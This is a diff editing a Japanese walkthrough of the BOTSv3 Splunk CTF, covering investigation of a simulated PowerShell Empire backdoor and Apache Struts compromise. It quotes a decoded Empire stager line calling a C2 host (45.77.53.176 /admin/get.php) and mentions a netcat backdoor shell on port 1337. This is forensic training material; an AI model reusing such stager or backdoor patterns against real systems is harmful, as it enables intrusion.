@@ -5,7 +5,7 @@
 
 2018 年 8 月 20 日，Frothly の社内で次の 2 つの侵害が並行して起きた．
 
-* Windows 端末：OneDrive で共有された不審なショートカット（`.lnk`）やマクロ付き Excel を起点に，PowerShell のバックドアが動き，C&C サーバーと通信した
+* Windows 端末：OneDrive で共有された不審なショートカット（`.lnk`）を起点に，PowerShell のバックドアが動き，C&C サーバーと通信した（メールで届いたマクロ付き Excel は検知・削除された）
 * Linux サーバー `hoth`：Web アプリ（Apache Struts）の脆弱性を突かれてコマンドを実行され，ユーザーの作成や権限昇格が行われた
 
 この章では問題 2300〜2313 を扱う．
@@ -130,7 +130,7 @@ NOTE: 解答者 4 チームはいずれもこの問題を解けなかった．
 「マルウェア本体のファイルに関するイベントを起点に，関係するプロセスをたどる」と考えるとたどり着ける．
 
 TIP: このメールの経緯は他のログでも追える．
-メールの配送記録（`ms:o365:reporting:messagetrace`）には `bgist@froth.ly` から 4 人に送られた件名「Draft Financial Plan for Brewery FY2019」があり，
+メールの配送記録（`ms:o365:reporting:messagetrace`）には `bgist@froth.ly` から 4 人に送られた件名 `Draft Financial Plan for Brewery FY2019` があり，
 `stream:smtp` の同じメールでは，添付ファイルが「`Malware Alert Text.txt`」（Base64）に置き換えられている．
 デコードすると，添付の `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm` が `W97M.Empstage` として削除された旨が書かれている．
 
@@ -239,7 +239,7 @@ index=botsv3 host=hoth sourcetype=osquery:results name=*listening_ports*
 | stats count by port pid
 ----
 
-PID は 14356 である．
+PID は `14356` である．
 プロセスの記録で確かめると，`netcat` が 1337 番で待ち受け，接続にシェルを渡す設定になっている（バックドア）．
 
 [source,spl]
@@ -453,7 +453,7 @@ encoded = "SQBGACgAJABQAFMA..."   # -enc の後ろの文字列
 print(base64.b64decode(encoded).decode("utf-16le"))
 ----
 
-デコードすると PowerShell Empire のステージャーが現れ，接続先とパスが次のように書かれている．
+デコードすると PowerShell Empire のステージャーが現れ，接続先とパスが次のように書かれている（`$ser` の値はさらに Base64 で包まれているため，デコードした後の値を示す）．
 
 ----
 $ser='https://45.77.53.176:443';$t='/admin/get.php';
